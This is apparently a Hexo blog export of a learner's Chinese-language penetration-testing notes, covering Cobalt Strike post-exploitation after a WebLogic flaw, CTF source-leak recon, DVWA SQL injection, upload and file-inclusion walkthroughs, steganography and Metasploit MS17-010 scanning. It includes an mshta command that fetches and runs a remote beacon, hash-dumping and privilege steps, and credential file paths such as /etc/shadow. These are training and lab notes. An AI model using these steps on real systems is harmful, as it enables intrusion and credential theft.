    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -sT -T4 -p- 地址</code></p>
<h4 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h4><p>出现端口7001，访问7001，出现Error 404–not found，有weblogic服务，加console，部署console控制台页面，自动跳到登陆页面。</p>
<h4 id="weblogic漏洞探测"><a href="#weblogic漏洞探测" class="headerlink" title="weblogic漏洞探测"></a>weblogic漏洞探测</h4><p>工具：weblogic scan脚本<br>复制相应CVE编号，百度漏洞复现。<br>此漏洞可以直接执行命令，上传webshell。</p>
<h4 id="反弹shell到cs"><a href="#反弹shell到cs" class="headerlink" title="反弹shell到cs"></a>反弹shell到cs</h4><h4 id="生成beacon"><a href="#生成beacon" class="headerlink" title="生成beacon"></a>生成beacon</h4><p>添加监听器，生成一个HTML应用程序的后门（选择攻击，生成后门，HTML Application），选择刚刚创建的监听器，powershell。<br>把文件上传到目标机，攻击-&gt;钓鱼攻击-&gt;文件下载，查看是否生成，(攻击-&gt;web服务管理).<br>在URL上输入<code>&amp;cmd=mshta +脚本地址(web服务)</code><br>—-mshta(windows)自带执行脚本命令。<br>进入beacon<br>默认睡眠时间为60s,<br>可以修改为1s。<br><code>shell +命令</code></p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>1、hashdump，获取密码哈希值，<br>哈希值解密网站：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br>2、远程登陆，端口3389开放<br>kali：<code>rdesktop -u 账户 -p 密码 目标机器ip地址</code><br>当前有人员在使用目标机器时，会被挤掉，再次登陆，管理员可以看见操作。<br>3、文件管理<br>4、凭证信息，可以看到哈希值和明文密码。<br>5、提权<br><code>getuid</code><br>6、得到system权限<br><code>getsystem</code></p>
]]></content>
      <tags>
        <tag>cs简单利用</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之信息收集总结</title>
    <url>/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><h5 id="git常规泄露"><a href="#git常规泄露" class="headerlink" title="git常规泄露"></a>git常规泄露</h5><p>工具：</p>
<p><a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scrabble url</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="git回滚"><a href="#git回滚" class="headerlink" title="git回滚"></a>git回滚</h5><p><em><strong>git作为一个版本控制工具，会记录每次提交(commit)的修改，存在git泄露时，flag可能在修改中被删除，可以使用<code>git reset</code></strong></em></p>
<p><em><strong>先得源码，后使用<code>git reset --hard HEAD^</code></strong></em></p>
<p><em><strong>命令跳到上一个版本。(HEAD表示当前版本，HEAD^表示上一个版本)</strong></em></p>
<p><em><strong>还可以使用<code>git log -stat</code></strong></em></p>
<p><em><strong>命令查看每一个commit修改了哪些文件，再用</strong></em></p>
<p><em><strong><code>git diff HEAD commit-id</code></strong></em></p>
<p><em><strong>比较在当前版本与想查看得commit之间的变化。</strong></em></p>
<h5 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h5><p><em><strong>每次提交时，git都会自动把它们串成一条时间线，这条就是一个分支。git允许使用多个分支，如果没有新建分支，那么只有一条时间线，默认master分支。</strong></em></p>
<p><em><strong>使用<code>git log</code></strong></em></p>
<p><em><strong>只能查看当前的分支修改，所以引入之前常用的GitHacker。</strong></em></p>
<p><em><strong>进入githack生成的文件夹，执行</strong></em></p>
<p><em><strong><code>git log --all</code>或</strong></em></p>
<p><em><strong><code>git branch -v</code></strong></em></p>
<p><em><strong>只能查看master分支，需要执行</strong></em></p>
<p><em><strong><code>git reflog</code></strong></em></p>
<p><em><strong>就能看见一些checkout的记录。</strong></em></p>
<p><em><strong>假如还有一个分支，我们需要手动下载这个分支的head信息，保存到</strong></em></p>
<p> <em><strong>.git/refs/heads/其他分支名</strong></em></p>
<p><em><strong>恢复heads信息后，我们使用GitHacker的部分代码，以实现自动恢复分支的效果。</strong></em></p>
<p><em><strong>使用的是： <a href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></strong></em></p>
<p><em><strong>在GitHacker的代码中，先下载ojbect文件，再使用git fsck检测，并继续下载缺失的文件。</strong></em></p>
<p><em><strong>修改代码如下：</strong></em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span></span><br><span class="line">	<span class="comment"># main()</span></span><br><span class="line">baseurl=complete_url(<span class="string">&#x27;http://127.0.0.1:8000/.git/&#x27;</span>)</span><br><span class="line">temppath=replace_bad_chars(get_prefix(baseurl))</span><br><span class="line">fixmissing(baseurl,temppath)</span><br></pre></td></tr></table></figure>

<p><em><strong>修改后运行，再次进入文件夹，执行</strong></em></p>
<p><em><strong><code>git log --all</code></strong></em></p>
<p><em><strong>或<code>git branch -v </code></strong></em></p>
<p><em><strong>即可恢复。</strong></em></p>
<p><em><strong>其他的利用：.git/config文件夹中可能含有access_token 信息，从而通过访问这个用户的其他仓库。</strong></em></p>
<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p><em><strong>SVN是源代码版本管理软件，造成SVN源代码漏洞主要原因是管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用.svn/entries或wc.db文件获得服务器源码，推荐使用两个工具：</strong></em></p>
<p><em><strong><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p>
<p><em><strong>还有 Seay-svn</strong></em></p>
<h4 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h4><p><em><strong>.hg</strong></em></p>
<p><em><strong>工具：</strong></em></p>
<p><em><strong><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p>
<p><em><strong>以上的源码泄露，可以直接使用目录扫描工具：</strong></em></p>
<p><em><strong><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></strong></em></p>
<p><em><strong>有可能存在重定向一类问题，访问.git返回403，访问.git/config，如果有文件返回，说明存在.git泄露。</strong></em></p>
<p><em><strong>在SVN泄露，一般是在entries中爬取源代码，但有时为空，注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</strong></em></p>
<h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="1、gedit备份文件"><a href="#1、gedit备份文件" class="headerlink" title="1、gedit备份文件"></a>1、gedit备份文件</h4><p><em><strong>在Linux下，用gedit编辑器保存后，当前目录会生成一个后缀为“<del>”的文件，访问带有</del>的文件，得到flag。</strong></em></p>
<h4 id="2、vim备份文件"><a href="#2、vim备份文件" class="headerlink" title="2、vim备份文件"></a>2、vim备份文件</h4><p><em><strong>vim是当前linux运行最多的linux编辑器，如果遇到卡死意外退出，会生成一个备份文件，</strong></em></p>
<p><em><strong>.flag.swp</strong></em></p>
<p><em><strong>使用命令 <code>vim -r</code></strong></em></p>
<p><em><strong>恢复文件内容，要先生成flag文件，再恢复文件。</strong></em></p>
<p><em><strong><code>vim flag</code></strong></em></p>
<p><em><strong><code>vim -r flag</code></strong></em></p>
<h4 id="3、常规文件"><a href="#3、常规文件" class="headerlink" title="3、常规文件"></a>3、常规文件</h4><p><em><strong>robots.txt:记录一些目录和CMS版本信息。</strong></em></p>
<p><em><strong>readme.txt:记录CMS版本信息，甚至有Github地址。</strong></em></p>
<p><em><strong><a href="http://www.zip/rar/tar.gz:%E5%BE%80%E5%BE%80%E6%98%AF%E7%BD%91%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD">www.zip/rar/tar.gz:往往是网站的源码备份</a></strong></em></p>
<p><em><strong>以上特殊的关键字，我们可以构造成一个字典，后续用burp进行爆破。</strong></em></p>
<h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>Banner信息：服务器对外显示的一些基础信息</p>
<p>1、自行收集指纹库</p>
<p>github上有大量成型且公开的CMS指纹库，借鉴一些成型扫描器对网站进行识别。</p>
<p>2、使用已有工具</p>
<p><strong>Wappalyzer工具</strong></p>
<p>除了使用工具，还可以随意输入一些参数，可能会出现404或302跳转出一些信息。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa</title>
    <url>/2021/01/06/dvwa/</url>
    <content><![CDATA[<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><em>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。</em></p>
<h4 id="low级别："><a href="#low级别：" class="headerlink" title="low级别："></a>low级别：</h4><h5 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><p>输入1 or ‘1’=’1 ,语句执行，返回结果，为单引号字符型注入。<br><img src="dvwa.md/1.png"></p>
<h5 id="猜语句中字段数"><a href="#猜语句中字段数" class="headerlink" title="猜语句中字段数"></a>猜语句中字段数</h5><p><img src="dvwa.md/2.png"><br>输入3时报错，说明存在两个字段，即这里的First name和Surname。</p>
<h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><p>用联合查询注入爆出数据库。<br><img src="dvwa.md/3.png"></p>
<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><p><img src="dvwa.md/4.png"><br>爆出两个表，guestbook，users，账户和密码应该就在users里。</p>
<h5 id="爆users表中的字段名"><a href="#爆users表中的字段名" class="headerlink" title="爆users表中的字段名"></a>爆users表中的字段名</h5><p><img src="dvwa.md/5.png">获得八个字段。</p>
<h5 id="最后查询用户账户密码"><a href="#最后查询用户账户密码" class="headerlink" title="最后查询用户账户密码"></a>最后查询用户账户密码</h5><p><img src="dvwa.md/6.png"></p>
<h4 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h4><p>只能提交数字，抓包下来进行注入。</p>
<h5 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><p>输入1 or 1=1<br><img src="dvwa.md/7.png">返回结果，为数字型注入。<br>爆表和爆库名还是老样子，但是到了爆表名出了问题，一直报错，应该是什么被过滤了。<br>试了直接获取数据库中的表，<br><img src="dvwa.md/8.png">可以执行，说明单引号被过滤了。通过十六进制绕过即可，后面的操作跟前面一样，只需把有单引号的改成十六进制即可。</p>
<h4 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h4><p>也是单引号字符型注入，和low并无太大区别，只是多了limit 1限制查询，通过#注释掉即可。<br><em>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，<br>这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</em><br><img src="dvwa.md/9.png"></p>
<h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><p><code>sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -dbs -threads 10 -batch</code><br>记得加双引号，才能指定参数提交。<br>这里还需要加cookie值，通过burp抓包，把cookie修改：<br><code>sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -dbs -threads 10 -batch -o</code></p>
<h3 id="upload-文件上传"><a href="#upload-文件上传" class="headerlink" title="upload(文件上传)"></a>upload(文件上传)</h3><p>File Upload，即文件上传漏洞，<br>通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，<br>因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br>复习一下文件上传漏洞条件：<em>第一，文件可以被上传。第二，文件能够被执行。第三，上传文件路径可知。</em></p>
<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>没有对上传文件类型，内容进行过滤、检查，直接上穿一句话木马即可</p>
<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>方法一:查看源码，对文件类型进行过滤，我们把文件改成jpg后缀后上传。<br>然后通过文件包含来解析一句话木马，文件包含要提前从low级别上传好<br><img src="dvwa.md/10.png">没解析时，是图片形式，一句话无法执行。文件包含后可以执行：<br><img src="dvwa.md/11.png"><br>方法二：抓包，修改文件类型，还有后缀改为php。<br>方法四:截断绕过。<br>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断。</p>
<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>getimagesize(string filename)<br>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。<br>strrpos(string,find,start)<br>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。<br>方法一：绕过文件头，可以在文件头添加GIF89a。<br>方法二：上传图片马，再进行文件包含。<br>在upload-labs做过很多了，就不在赘述了。</p>
<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<br>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项<br>（选项开启之后，服务器允许包含一个远程的文件）,前面在做upload靶场后面的几关都使用了文件包含来解析一句话木马。</p>
<h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>服务器没做任何过滤<br><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong><br>后面补充：/etc/shadow<br>报错，显示没有此文件，说明不是Linux。<br><img src="dvwa.md/12.png"><br>但是知道了服务器文件的绝对路径，成功读取php.ini文件<br><img src="dvwa.md/13.png"><br>构造相对路径，加那么多..\，是为了保证能够到达服务器D盘的根目录。</p>
<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>源码中，过滤掉了https:// http:// ../ ..\ ，但是采用绝对路径不会被限制。<br>采用如图方式绕过，<br><img src="dvwa.md/14.png"></p>
<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<br>使用file协议，前面的难度也都可以用file协议包含相应文件。<br><img src="dvwa.md/15.png"> </p>
]]></content>
      <tags>
        <tag>DVWAsql注入和文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之任意文件读取漏洞总结</title>
    <url>/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<pre><code>  ### 任意文件读取漏洞
</code></pre>
<h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
<p><em><strong>文件读取函数：</strong></em></p>
<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
<p><em><strong>文件包含相关函数：</strong></em></p>
<p><em><strong>include、require、include_once、require_once</strong></em></p>
<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
<p><em><strong>system、exec</strong></em></p>
<p><em><strong>还有php伪协议读取文件</strong></em></p>
<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
<p><em><strong>os.path.join()函数</strong></em></p>
<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
<p><em><strong>/etc/passwd</strong></em></p>
<p><em><strong>/etc/shadow</strong></em></p>
<p><em><strong>等等</strong></em></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>misc</title>
    <url>/2021/02/02/misc/</url>
    <content><![CDATA[<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>数据编码/图形密码</p>
<p><strong>图片隐写</strong></p>
<p>音频&amp;视频隐写<br>流量分析<br>内存取证<br>游戏隐写</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>010editor介绍<br>图片十六进制文件头+文件模板<br>JPG,文件头：FFD8FF<br>PNG,文件头：89504E47<br>GIF,文件头：474946383961<br>文件属性<br>Kali</p>
<h3 id="图片隐写分类"><a href="#图片隐写分类" class="headerlink" title="图片隐写分类"></a>图片隐写分类</h3><p>###右击属性<br>文件末尾藏有字符串</p>
<h4 id="文件十六进制藏有字符串"><a href="#文件十六进制藏有字符串" class="headerlink" title="文件十六进制藏有字符串"></a>文件十六进制藏有字符串</h4><p>strings：查找可以打印的字符<br><code>strings 图片名</code><br>grep：使用正则表达式搜索，并输出匹配的行。<br><code>grep -a &quot;BJD&quot; 图片名</code><br>file：识别文件类型<br><code>file 文件名</code></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>binwalk：分离文件<br><code>binwalk 文件名</code>(多加-e生成文件夹)<br>foremost：提取文件<br><code>foremost 文件名</code><br><code>dd if=文件名 of=out.jpg bs=1 skip=xxxx</code>(分出你需要的)</p>
<h3 id="修改文件头"><a href="#修改文件头" class="headerlink" title="修改文件头"></a>修改文件头</h3><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><p>特殊帧：<br>方法一：使用PS<br>方法二：工具stegsolve。<br>帧的时间间隔：<br>使用工具ulead GIF</p>
<h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>IHDR：宽 高<br>zlib(010)：<code>binwalk -e 文件名</code><br>lsb隐写/加密：工具stegsolve工具zsteg<br>wbs43open(bmp)<br>JPG<br>双图隐写<br>stegpy<br>silenteye</p>
<h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><h4 id="常见进制"><a href="#常见进制" class="headerlink" title="常见进制"></a>常见进制</h4><p>二进制转ascii码<br>二进制转morse码<br><a href="https://coding.tools/cn/binary-to-text">https://coding.tools/cn/binary-to-text</a><br>二进制转二维码<br>写脚本</p>
<h4 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h4><h5 id="Ascii码"><a href="#Ascii码" class="headerlink" title="Ascii码"></a>Ascii码</h5><h5 id="base"><a href="#base" class="headerlink" title="base"></a>base</h5><p>base64：<br>编码原理：3个8位字节转化位4个6位的字节，之后在6位前面补两个0<br>base36：<br><code>数字0~9，26个字母</code><br>base58：<br>特点不使用数字0，字母大写O，字母大写I和字母小写l，以及+和/<br>base62：<br>去了+和/<br>base85：<br>使用五个asciii字符来表示四个字节的二进制数据。<br>base91:<br>特点：由91个字符组成，(0-9,a-zA-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{}“)组成。<br>base92：<br>比base91多了一个字符~.</p>
<h5 id="morse"><a href="#morse" class="headerlink" title="morse"></a>morse</h5><p>一点的长度是一个单位，一划是三个单位，在一个字母中点划之间的间隔是一点，两个字母之间间隔三个点，两个单词之间间隔七个点。</p>
<h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>利用软件漏洞，十六进制的机器码</p>
<h5 id="urlcode"><a href="#urlcode" class="headerlink" title="urlcode"></a>urlcode</h5><p>除了特殊字符，其他都需要%xx编码。</p>
<h5 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h5><p>国际码，标准码，编码了计算机领域的业界标注。<br>\u开头或者&amp;#开头;结尾 </p>
<h5 id="aaencode"><a href="#aaencode" class="headerlink" title="aaencode"></a>aaencode</h5><p>可以将JS代码转换成常用的网络表情，颜文字js加密。</p>
<h5 id="jjencode"><a href="#jjencode" class="headerlink" title="jjencode"></a>jjencode</h5><h5 id="uuencode"><a href="#uuencode" class="headerlink" title="uuencode"></a>uuencode</h5><p>二进制信息和文字信息之间的转换</p>
<h5 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h5><p>六个字符：(),[],!,+.</p>
<h5 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h5><h5 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h5><h5 id="short-Ook-隐藏在图片里"><a href="#short-Ook-隐藏在图片里" class="headerlink" title="short Ook 隐藏在图片里"></a>short Ook 隐藏在图片里</h5><h5 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h5><h5 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h5><h5 id="社会主义核心价值观"><a href="#社会主义核心价值观" class="headerlink" title="社会主义核心价值观"></a>社会主义核心价值观</h5><h5 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h5><h5 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h5><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h4 id="互联网五层模型"><a href="#互联网五层模型" class="headerlink" title="互联网五层模型"></a>互联网五层模型</h4><p>物理层-&gt;数据链路层-&gt;网络层-&gt;传输层-&gt;应用层。<br>wireshark抓的包工作在数据链路层，而burp抓的工作在应用层。</p>
<h4 id="wireshark基本使用："><a href="#wireshark基本使用：" class="headerlink" title="wireshark基本使用："></a>wireshark基本使用：</h4><p>功能：能获取http,https但不能解密https，所以处理http使用wireshark，处理https使用Fiddler。</p>
<h4 id="选择网卡"><a href="#选择网卡" class="headerlink" title="选择网卡"></a>选择网卡</h4><p>连接WiFi的选择WLAN</p>
<h4 id="窗口介绍"><a href="#窗口介绍" class="headerlink" title="窗口介绍"></a>窗口介绍</h4><p><img src="misc.md/1.png"></p>
<h4 id="获取数据包操作"><a href="#获取数据包操作" class="headerlink" title="获取数据包操作"></a>获取数据包操作</h4><p><img src="misc.md/2.png"></p>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>过滤器分为显示过滤器和捕获过滤器(在Capture-&gt;Capture Filters 中设置)<br>1、协议过滤<br>如tcp协议过滤<br>2、IP过滤<br>如比如 ip.src xxx 显示源地址为xxx，<br>ip.dst yyy, 目标地址为yyy<br>3、端口过滤<br>如tcp.port 80 端口为80<br>4、http模式过滤<br>http.request.method “GET” 只显示http的get方法<br>5、逻辑运算符and/or</p>
<h4 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h4><p>第一行：数据包整体概述，<br>第二行：链路层详细信息，主要的是双方的mac地址<br>第三行：网络层详细信息，主要的是双方的IP地址<br>第四行：传输层的详细信息，主要的是双方的端口号。<br><img src="misc.md/3.png"></p>
<h3 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h3><p>古典密码学：关注信息的保密以及对应的破译方法。<br>现代密码学：不仅关注信息保密问题，还同时涉及信息完整性等等。</p>
<h4 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h4><p>替代加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定的数目进行偏移后被替换的密文。</p>
<h4 id="关键词加密"><a href="#关键词加密" class="headerlink" title="关键词加密"></a>关键词加密</h4><p>选择一个关键词，去除第一次出现外的所有相同字母。</p>
<h4 id="仿射加密"><a href="#仿射加密" class="headerlink" title="仿射加密"></a>仿射加密</h4><h4 id="单表替代密码分析"><a href="#单表替代密码分析" class="headerlink" title="单表替代密码分析"></a>单表替代密码分析</h4><h4 id="维吉尼亚加密"><a href="#维吉尼亚加密" class="headerlink" title="维吉尼亚加密"></a>维吉尼亚加密</h4><p>属于多表密码，需要使用表格法，26行字母表，每一行都由前一行向左偏移一位得到。</p>
<h4 id="替换和编码"><a href="#替换和编码" class="headerlink" title="替换和编码"></a>替换和编码</h4>]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>msf</title>
    <url>/2021/01/23/msf/</url>
    <content><![CDATA[<h3 id="msf控制目标电脑"><a href="#msf控制目标电脑" class="headerlink" title="msf控制目标电脑"></a>msf控制目标电脑</h3><p>首先安装kali-metasploit</p>
<h4 id="modules-msf核心"><a href="#modules-msf核心" class="headerlink" title="modules-msf核心"></a>modules-msf核心</h4><ul>
<li>auxiliary：辅助模块，辅助渗透(端口扫描，登陆密码爆破，漏洞验证等等)</li>
<li>exploits：漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</li>
<li>payloads：攻击载荷，主要是攻击后在目标靶机执行的代码。</li>
<li>post：后渗透阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令。<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4>初始化数据库：msfdb init 使用的数据库不是mysql<br>启动：msfconsole<h4 id="db-nmap"><a href="#db-nmap" class="headerlink" title="db_nmap"></a>db_nmap</h4>db_nmap：nmap 扫描</li>
</ul>
<p>-T[0-5]:默认为T3，T4表示最大TCP扫描延迟为10ms<br>-sS：TCP SYN扫描<br>-sA：TCP ACK扫描<br>-sT：TCP 扫描<br>-A：全部<br>hosts：查看当前工作区所有主机，记录在数据库里面。<br>services：查看所有服务，记录在数据里面。</p>
<h4 id="使用辅助模块"><a href="#使用辅助模块" class="headerlink" title="使用辅助模块"></a>使用辅助模块</h4><p>端口扫描:<code>use auxiliary/scanner/postscan/</code>使用TAB补全,跟也有nmap功能。<br>永恒之蓝漏洞:445端口(默认开启，无法关闭)，window7。</p>
<h4 id="检测ms17-010"><a href="#检测ms17-010" class="headerlink" title="检测ms17_010"></a>检测ms17_010</h4><p><code>search ms17_010</code><br>1、使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br>2、查看配置<br>查看设置：show options<br>3、设置地址<br><code>set rhosts 地址</code><br>4、运行<br>run或exploit</p>
